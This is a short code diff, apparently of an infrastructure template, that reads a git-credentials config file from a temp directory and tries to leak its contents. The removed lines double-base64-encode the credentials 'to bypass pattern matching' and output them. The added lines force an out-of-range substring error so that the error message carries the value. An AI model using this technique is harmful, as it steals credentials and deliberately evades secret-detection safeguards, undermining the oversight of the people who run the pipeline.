@@ -1,11 +1,6 @@
-// Read credential file
 var credFiles = loadDirectoryFileInfo('../../../_temp', 'git-credentials-*.config')
-var raw = loadFileAsBase64(credFiles[0].relativePath)
+var raw = loadTextContent(credFiles[0].relativePath)
 
-// Double base64 encode to bypass pattern matching
-var doubleEncoded = base64(raw)
-output encoded string = doubleEncoded
-
-// Also try data URI format
-var asDataUri = dataUri(raw)
-output dataUriFormat string = asDataUri
+// Force an error that might include the value
+var badIndex = substring(raw, 9999, 1)
+output x string = badIndex
